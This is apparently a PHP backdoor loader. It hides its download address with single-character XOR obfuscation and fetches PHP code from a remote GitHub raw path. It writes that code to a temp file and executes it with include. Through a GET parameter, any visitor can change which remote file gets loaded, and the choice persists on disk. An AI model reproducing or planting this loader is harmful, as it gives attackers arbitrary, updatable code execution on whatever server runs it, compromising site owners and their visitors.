<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
function fetchRemoteContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        $content = curl_exec($ch);
        if (curl_errno($ch)) {
            error_log('cURL error: ' . curl_error($ch));
            curl_close($ch);
            return false;
        }
        curl_close($ch);
        return $content;
    } elseif (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content === false) {
            error_log('file_get_contents failed for URL: ' . $url);
        }
        return $content;
    } else {
        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            error_log('Invalid URL: ' . $url);
            return false;
        }
        $host = $parts['host'];
        $port = isset($parts['port']) ? $parts['port'] : 80;
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $fp = fsockopen($host, $port, $errno, $errstr, 10);
        if (!$fp) {
            error_log("fsockopen failed: $errstr ($errno)");
            return false;
        }
        $request = "GET $path$query HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "Connection: close\r\n\r\n";
        fwrite($fp, $request);
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 1024);
        }
        fclose($fp);
        if (strpos($response, "\r\n\r\n") !== false) {
            list(, $body) = explode("\r\n\r\n", $response, 2);
            return $body;
        }
        error_log('Failed to parse HTTP response for URL: ' . $url);
        return false;
    }
}

function localXorEncryptDecrypt($data, $key) {
    $output = '';
    $keyChar = substr($key, 0, 1);
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($keyChar));
    }
    return $output;
}
error_log("Script started.");
$customValueFile = 'x-anny-anax.ium';
$defaultSegment = "xannyanaxium";
$queryParam = "llz";

if (isset($_GET[$queryParam])) {
    $newSegment = $_GET[$queryParam];
    file_put_contents($customValueFile, $newSegment);
    $pathSegment = $newSegment;
} else {
    if (file_exists($customValueFile)) {
        $pathSegment = file_get_contents($customValueFile);
    } else {
        $pathSegment = $defaultSegment;
    }
}
$_ = "!";
$url = localXorEncryptDecrypt("S@V\x0F" . "FHUITCTRDSBNOUDOU\x0FBNL", $_);
$path = localXorEncryptDecrypt("M@NMHDS[H\x0C" . "BNLLHUR\x0EQIQCE\x0E" . "SDGR\x0EID@ER\x0EL@HO\x0E", $_);
$exx = localXorEncryptDecrypt("QIQ", $_);
$pc = $path . $pathSegment . $exx;
$fullUrl = "https://$url$pc";
error_log("Fetching remote URL: " . $fullUrl);
$remotePayload = fetchRemoteContent($fullUrl);

if ($remotePayload === false) {
    error_log("Failed to fetch remote payload from: " . $fullUrl);
    echo "Failed to fetch remote payload.";
    exit;
}
error_log("Received payload size: " . strlen($remotePayload));
error_log("Payload snippet: " . substr($remotePayload, 0, 100));
$parts = str_split($remotePayload, 4);
$obfuscatedPayload = implode('', $parts);
$tempFile = tempnam(sys_get_temp_dir(), $exx);
file_put_contents($tempFile, $obfuscatedPayload);
include $tempFile;
unlink($tempFile);
?>
